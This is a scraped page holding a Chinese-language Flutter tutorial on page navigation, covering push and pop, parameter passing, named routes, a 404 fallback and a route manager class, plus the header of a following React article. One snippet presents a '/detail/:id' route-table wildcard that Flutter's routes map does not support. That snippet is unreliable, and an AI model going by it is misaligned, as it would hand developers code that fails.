                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Flutter 开发中实现页面跳转的核心知识点。Flutter 提供了两种导航方式：<strong>基础导航（适用于简单场景、少量页面）</strong> 和 <strong>命名路由（适用于复杂场景、多页面应用）</strong></p>
<h3 data-id="heading-0">一、核心概念</h3>
<p>在 Flutter 中，所有页面都是「Widget」，导航的本质是「管理页面栈（Stack）」：</p>
<ul>
<li>「跳转页面」：将新页面「压入」栈顶（<code>push</code>）。</li>
<li>「返回页面」：将当前页面「弹出」栈顶（<code>pop</code>）。</li>
<li>Flutter 提供了 <code>Navigator</code> 组件来管理页面栈，日常开发中常用 <code>Navigator.of(context)</code> 来获取导航实例。</li>
</ul>
<hr/>
<h2 data-id="heading-1">方案 1：基础导航（直接跳转，简单高效）</h2>
<p>适用于 <strong>页面数量少（3-5 个）、无需传参 / 少量传参</strong> 的场景（如简单工具类 App），核心是 <code>Navigator.push()</code> 和 <code>Navigator.pop()</code>。</p>
<h3 data-id="heading-2">1.1 基本页面跳转（无参）</h3>
<h4 data-id="heading-3">步骤 1：定义两个页面 Widget（首页 + 详情页）</h4>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;

<span class="hljs-keyword">void</span> main() =&gt; runApp(<span class="hljs-keyword">const</span> MyApp());

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyApp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">const</span> MyApp({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> MaterialApp(
      title: <span class="hljs-string">'Flutter 导航示例'</span>,
      theme: ThemeData(primarySwatch: Colors.blue),
      home: <span class="hljs-keyword">const</span> HomePage(), <span class="hljs-comment">// 首页</span>
    );
  }
}

<span class="hljs-comment">// 首页 Widget</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HomePage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">const</span> HomePage({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Scaffold(
      appBar: AppBar(title: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'首页'</span>)),
      body: Center(
        child: ElevatedButton(
          onPressed: () {
            <span class="hljs-comment">// 核心：跳转至详情页（push 压入栈顶）</span>
            Navigator.push(
              context,
              MaterialPageRoute(
                builder: (context) =&gt; <span class="hljs-keyword">const</span> DetailPage(), <span class="hljs-comment">// 目标页面</span>
              ),
            );
          },
          child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'跳转到详情页'</span>),
        ),
      ),
    );
  }
}

<span class="hljs-comment">// 详情页 Widget</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DetailPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">const</span> DetailPage({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Scaffold(
      appBar: AppBar(
        title: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'详情页'</span>),
        <span class="hljs-comment">// 导航栏默认自带返回按钮，点击等价于 Navigator.pop()</span>
      ),
      body: Center(
        child: ElevatedButton(
          onPressed: () {
            <span class="hljs-comment">// 核心：返回上一页（pop 弹出栈顶）</span>
            Navigator.pop(context);
          },
          child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'返回首页'</span>),
        ),
      ),
    );
  }
}
</code></pre>
<h4 data-id="heading-4">关键说明：</h4>
<ul>
<li><code>MaterialPageRoute</code>：Material 风格的路由过渡动画（Android 上下滑动、iOS 左右滑动），无需手动配置。</li>
<li><code>Navigator.push(context, route)</code>：将目标页面压入栈顶，实现跳转。</li>
<li><code>Navigator.pop(context)</code>：将当前页面弹出栈顶，返回上一页（无返回值）。</li>
<li>详情页的 <code>AppBar</code> 会默认添加返回按钮，点击后自动调用 <code>Navigator.pop()</code>，无需手动实现。</li>
</ul>
<h3 data-id="heading-5">1.2 页面传参（带参跳转 + 返回值传递）</h3>
<p>实际开发中常需要给下一页传参（如传递商品 ID），或接收下一页的返回值（如选择图片后返回图片路径）。</p>
<h4 data-id="heading-6">步骤 1：带参跳转（首页 → 详情页，传递字符串 / 数字）</h4>
<p>修改 <code>DetailPage</code> 增加构造函数接收参数，修改首页的跳转逻辑：</p>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-comment">// 详情页（修改：添加构造函数接收参数）</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DetailPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> title; <span class="hljs-comment">// 接收的标题参数</span>
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">int</span> id; <span class="hljs-comment">// 接收的ID参数</span>

  <span class="hljs-comment">// 构造函数（必填参数，也可设置可选参数）</span>
  <span class="hljs-keyword">const</span> DetailPage({<span class="hljs-keyword">super</span>.key, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.title, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.id});

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Scaffold(
      appBar: AppBar(title: Text(title)),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Text(<span class="hljs-string">'接收的ID：<span class="hljs-subst">$id</span>'</span>),
            <span class="hljs-keyword">const</span> SizedBox(height: <span class="hljs-number">20</span>),
            ElevatedButton(
              onPressed: () {
                <span class="hljs-comment">// 返回上一页，并携带返回值（"从详情页返回的内容"）</span>
                Navigator.pop(context, <span class="hljs-string">"从详情页返回的内容"</span>);
              },
              child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'返回首页并传值'</span>),
            ),
          ],
        ),
      ),
    );
  }
}

<span class="hljs-comment">// 首页（修改：带参跳转 + 接收返回值）</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HomePage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">const</span> HomePage({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Scaffold(
      appBar: AppBar(title: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'首页'</span>)),
      body: Center(
        child: ElevatedButton(
          onPressed: () <span class="hljs-keyword">async</span> {
            <span class="hljs-comment">// 异步接收返回值（await 等待 Navigator.push 执行完成）</span>
            <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> Navigator.push(
              context,
              MaterialPageRoute(
                builder: (context) =&gt; <span class="hljs-keyword">const</span> DetailPage(
                  title: <span class="hljs-string">'详情页（带参）'</span>,
                  id: <span class="hljs-number">1001</span>,
                ),
              ),
            );

            <span class="hljs-comment">// 打印返回值（详情页传递的内容）</span>
            <span class="hljs-keyword">if</span> (result != <span class="hljs-keyword">null</span>) {
              ScaffoldMessenger.of(context).showSnackBar(
                SnackBar(content: Text(<span class="hljs-string">'接收的返回值：<span class="hljs-subst">$result</span>'</span>)),
              );
            }
          },
          child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'带参跳转到详情页'</span>),
        ),
      ),
    );
  }
}
</code></pre>
<h4 data-id="heading-7">关键说明：</h4>
<ol>
<li><strong>给下一页传参</strong>：通过目标页面的「构造函数」传递，支持所有 Dart 数据类型（字符串、数字、对象等）。</li>
<li><strong>接收下一页返回值</strong>：<code>Navigator.push()</code> 是异步操作，返回 <code>Future</code>，通过 <code>await</code> 可接收目标页面 <code>pop</code> 时传递的参数。</li>
<li><strong><code>Navigator.pop(context, result)</code></strong> ：第二个参数是返回值，可省略（无返回值时）。</li>
</ol>
<h2 data-id="heading-8">方案 2：命名路由（配置式跳转，适合复杂应用）</h2>
<p>适用于 <strong>页面数量多（5 个以上）、需要统一管理、频繁跳转</strong> 的场景（如电商、社交 App），核心是「提前配置路由表，通过路由名称跳转」。</p>
<h3 data-id="heading-9">2.1 基本配置与跳转（无参）</h3>
<h4 data-id="heading-10">步骤 1：在 <code>MaterialApp</code> 中配置 <code>routes</code> 路由表</h4>
<p>路由表是一个 <code>Map&lt;String, WidgetBuilder&gt;</code>，key 是路由名称（通常以 <code>/</code> 开头），value 是页面构建函数。</p>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyApp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">const</span> MyApp({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> MaterialApp(
      title: <span class="hljs-string">'Flutter 命名路由示例'</span>,
      theme: ThemeData(primarySwatch: Colors.blue),
      <span class="hljs-comment">// 1. 配置路由表</span>
      routes: {
        <span class="hljs-string">'/'</span>: (context) =&gt; <span class="hljs-keyword">const</span> HomePage(), <span class="hljs-comment">// 首页（默认路由）</span>
        <span class="hljs-string">'/detail'</span>: (context) =&gt; <span class="hljs-keyword">const</span> DetailPage(), <span class="hljs-comment">// 详情页</span>
      },
      <span class="hljs-comment">// 2. 设置默认启动页面（等价于 home: const HomePage()）</span>
      initialRoute: <span class="hljs-string">'/'</span>,
    );
  }
}
</code></pre>
<h4 data-id="heading-11">步骤 2：通过路由名称跳转 / 返回</h4>
<p>修改首页的跳转逻辑，使用 <code>Navigator.pushNamed()</code> 替代 <code>Navigator.push()</code>：</p>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-comment">// 首页</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HomePage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">const</span> HomePage({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Scaffold(
      appBar: AppBar(title: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'首页'</span>)),
      body: Center(
        child: ElevatedButton(
          onPressed: () {
            <span class="hljs-comment">// 核心：通过路由名称跳转</span>
            Navigator.pushNamed(context, <span class="hljs-string">'/detail'</span>);
          },
          child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'命名路由跳转到详情页'</span>),
        ),
      ),
    );
  }
}
</code></pre>
<h4 data-id="heading-12">关键说明：</h4>
<ul>
<li><code>routes</code>：路由表，统一管理所有页面，便于后期维护（修改页面只需修改路由表，无需修改所有跳转处）。</li>
<li><code>initialRoute</code>：默认启动路由（替代 <code>home</code>），必须和路由表中的某个 key 对应。</li>
<li><code>Navigator.pushNamed(context, '/detail')</code>：通过路由名称跳转，无需再创建 <code>MaterialPageRoute</code>。</li>
<li>返回逻辑不变，依然使用 <code>Navigator.pop(context)</code>。</li>
</ul>
<h3 data-id="heading-13">2.2 命名路由传参（带参跳转）</h3>
<p>命名路由传参有两种常用方式：<code>arguments</code> 传参（推荐）、路由名称拼接参数（不推荐，仅适用于简单参数）。</p>
<h4 data-id="heading-14">方式 1：<code>arguments</code> 传参（推荐，支持任意数据类型）</h4>
<ol>
<li>跳转时通过 <code>arguments</code> 传递参数：</li>
</ol>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// 首页跳转逻辑修改</span>
<span class="hljs-title function_ invoke__">ElevatedButton</span>(
  <span class="hljs-attr">onPressed</span>: () {
    <span class="hljs-comment">// 传递参数（可传字符串、数字、Map、自定义对象等）</span>
    Navigator.<span class="hljs-title function_ invoke__">pushNamed</span>(
      context,
      <span class="hljs-string">'/detail'</span>,
      <span class="hljs-attr">arguments</span>: {
        <span class="hljs-string">'title'</span>: <span class="hljs-string">'详情页（命名路由传参）'</span>,
        <span class="hljs-string">'id'</span>: <span class="hljs-number">1001</span>,
      },
    );
  },
  child: <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">Text</span>(<span class="hljs-string">'命名路由带参跳转'</span>),
),
</code></pre>
<ol start="2">
<li>详情页通过 <code>ModalRoute.of(context)?.settings.arguments</code> 接收参数：</li>
</ol>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-comment">// 详情页修改</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DetailPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">const</span> DetailPage({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-comment">// 接收 arguments 参数</span>
    <span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt; args = ModalRoute.of(context)?.settings.arguments <span class="hljs-keyword">as</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt;;

    <span class="hljs-keyword">return</span> Scaffold(
      appBar: AppBar(title: Text(args[<span class="hljs-string">'title'</span>])),
      body: Center(
        child: Text(<span class="hljs-string">'接收的ID：<span class="hljs-subst">${args[<span class="hljs-string">'id'</span>]}</span>'</span>),
      ),
    );
  }
}
</code></pre>
<h4 data-id="heading-15">方式 2：路由名称拼接参数（仅适用于简单参数，如 ID）</h4>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-comment">// 跳转时拼接参数</span>
Navigator.pushNamed(context, <span class="hljs-string">'/detail/1001'</span>);

<span class="hljs-comment">// 配置路由表时使用通配符</span>
routes: {
  <span class="hljs-string">'/detail/:id'</span>: (context) =&gt; <span class="hljs-keyword">const</span> DetailPage(),
},

<span class="hljs-comment">// 详情页提取参数（需额外解析，较繁琐，不推荐）</span>
<span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> id = ModalRoute.of(context)?.settings.name?.split(<span class="hljs-string">'/'</span>).last ?? <span class="hljs-string">''</span>;
</code></pre>
<h3 data-id="heading-16">2.3 未知路由处理（404 页面）</h3>
<p>当跳转的路由名称不在路由表中时，会出现错误，可通过 <code>onUnknownRoute</code> 配置兜底页面（404 页面）：</p>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyApp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">const</span> MyApp({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> MaterialApp(
      title: <span class="hljs-string">'Flutter 命名路由示例'</span>,
      theme: ThemeData(primarySwatch: Colors.blue),
      routes: {
        <span class="hljs-string">'/'</span>: (context) =&gt; <span class="hljs-keyword">const</span> HomePage(),
        <span class="hljs-string">'/detail'</span>: (context) =&gt; <span class="hljs-keyword">const</span> DetailPage(),
      },
      initialRoute: <span class="hljs-string">'/'</span>,
      <span class="hljs-comment">// 未知路由兜底</span>
      onUnknownRoute: (settings) {
        <span class="hljs-keyword">return</span> MaterialPageRoute(
          builder: (context) =&gt; <span class="hljs-keyword">const</span> NotFoundPage(),
        );
      },
    );
  }
}

<span class="hljs-comment">// 404 页面</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NotFoundPage</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">const</span> NotFoundPage({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Scaffold(
      appBar: AppBar(title: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'页面不存在'</span>)),
      body: <span class="hljs-keyword">const</span> Center(child: Text(<span class="hljs-string">'404 - 页面未找到'</span>)),
    );
  }
}
</code></pre>
<h2 data-id="heading-17">方案 3：进阶：路由管理（封装路由工具类）</h2>
<p>当项目页面非常多时，直接在 <code>MaterialApp</code> 中配置路由表会显得臃肿，推荐封装「路由工具类」，统一管理路由跳转、传参、拦截等逻辑。</p>
<h3 data-id="heading-18">3.1 封装路由工具类</h3>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:your_project_name/pages/home_page.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:your_project_name/pages/detail_page.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:your_project_name/pages/not_found_page.dart'</span>;

<span class="hljs-comment">// 路由名称常量（避免硬编码，便于维护）</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RouteNames</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">String</span> home = <span class="hljs-string">'/'</span>;
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-built_in">String</span> detail = <span class="hljs-string">'/detail'</span>;
}

<span class="hljs-comment">// 路由工具类</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RouteManager</span> </span>{
  <span class="hljs-comment">// 配置路由表</span>
  <span class="hljs-keyword">static</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, WidgetBuilder&gt; routes = {
    RouteNames.home: (context) =&gt; <span class="hljs-keyword">const</span> HomePage(),
    RouteNames.detail: (context) =&gt; <span class="hljs-keyword">const</span> DetailPage(),
  };

  <span class="hljs-comment">// 路由跳转（封装 pushNamed，统一处理传参）</span>
  <span class="hljs-keyword">static</span> Future&lt;T?&gt; pushNamed&lt;T&gt;(BuildContext context, <span class="hljs-built_in">String</span> routeName, {<span class="hljs-built_in">Object?</span> arguments}) {
    <span class="hljs-keyword">return</span> Navigator.pushNamed&lt;T&gt;(context, routeName, arguments: arguments);
  }

  <span class="hljs-comment">// 返回上一页（封装 pop，统一处理返回值）</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> pop&lt;T&gt;(BuildContext context, {T? result}) {
    Navigator.pop&lt;T&gt;(context, result);
  }

  <span class="hljs-comment">// 未知路由处理</span>
  <span class="hljs-keyword">static</span> Route&lt;<span class="hljs-built_in">dynamic</span>&gt; onUnknownRoute(RouteSettings settings) {
    <span class="hljs-keyword">return</span> MaterialPageRoute(
      builder: (context) =&gt; <span class="hljs-keyword">const</span> NotFoundPage(),
    );
  }
}
</code></pre>
<h3 data-id="heading-19">3.2 使用封装后的路由工具类</h3>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-comment">// MyApp 中配置</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyApp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-keyword">const</span> MyApp({<span class="hljs-keyword">super</span>.key});

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> MaterialApp(
      title: <span class="hljs-string">'Flutter 路由封装示例'</span>,
      theme: ThemeData(primarySwatch: Colors.blue),
      routes: RouteManager.routes,
      initialRoute: RouteNames.home,
      onUnknownRoute: RouteManager.onUnknownRoute,
    );
  }
}

<span class="hljs-comment">// 首页跳转</span>
ElevatedButton(
  onPressed: () {
    RouteManager.pushNamed(
      context,
      RouteNames.detail,
      arguments: {<span class="hljs-string">'title'</span>: <span class="hljs-string">'详情页（封装路由）'</span>, <span class="hljs-string">'id'</span>: <span class="hljs-number">1001</span>},
    );
  },
  child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'封装路由带参跳转'</span>),
),

<span class="hljs-comment">// 详情页返回</span>
ElevatedButton(
  onPressed: () {
    RouteManager.pop(context, result: <span class="hljs-string">"从封装路由详情页返回"</span>);
  },
  child: <span class="hljs-keyword">const</span> Text(<span class="hljs-string">'返回首页'</span>),
),
</code></pre>
<h2 data-id="heading-20">关键补充：路由过渡动画自定义</h2>
<p>默认的 <code>MaterialPageRoute</code> 是 Material 风格动画，若需要自定义过渡动画（如淡入淡出、缩放），可使用 <code>PageRouteBuilder</code>：</p>
<pre><code class="hljs language-Dart" lang="Dart"><span class="hljs-comment">// 自定义淡入淡出动画跳转</span>
Navigator.push(
  context,
  PageRouteBuilder(
    pageBuilder: (context, animation, secondaryAnimation) =&gt; <span class="hljs-keyword">const</span> DetailPage(),
    transitionsBuilder: (context, animation, secondaryAnimation, child) {
      <span class="hljs-comment">// 淡入淡出动画</span>
      <span class="hljs-keyword">return</span> FadeTransition(
        opacity: animation,
        child: child,
      );
    },
    transitionDuration: <span class="hljs-keyword">const</span> <span class="hljs-built_in">Duration</span>(milliseconds: <span class="hljs-number">500</span>), <span class="hljs-comment">// 动画时长</span>
  ),
);
</code></pre>
<h3 data-id="heading-21">总结</h3>
<ol>
<li>Flutter 导航核心是「页面栈管理」，通过 <code>Navigator</code> 实现 <code>push</code>（跳转）和 <code>pop</code>（返回）。</li>
<li>简单场景用「基础导航」（<code>Navigator.push</code>），快速高效；复杂场景用「命名路由」（<code>Navigator.pushNamed</code>），便于统一管理。</li>
<li>传参方式：基础导航用「构造函数」，命名路由用「<code>arguments</code>」（推荐）。</li>
<li>最佳实践：页面较多时封装「路由工具类」，统一管理路由表、跳转、未知路由，提升项目可维护性。</li>
<li>自定义过渡动画可使用 <code>PageRouteBuilder</code>，满足个性化 UI 需求。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[手写 React KeepAlive 组件：实现组件缓存与切换]]></title>    <link>https://juejin.cn/post/7602205524718944290</link>    <guid>https://juejin.cn/post/7602205524718944290</guid>    <pubDate>2026-02-03T10:09:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602205524718944290" data-draft-id="7602225961095790626" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="手写 React KeepAlive 组件：实现组件缓存与切换"/> <meta itemprop="keywords" content="前端,React.js"/> <meta itemprop="datePublished" content="2026-02-03T10:09:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="lIIIllIlIllIIl"/> <meta itemprop="url" content="https://juejin.cn/user/793196846923641"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            手写 React KeepAlive 组件：实现组件缓存与切换
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/793196846923641/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    lIIIllIlIllIIl
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T10:09:07.000Z" title="Tue Feb 03 2026 10:09:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
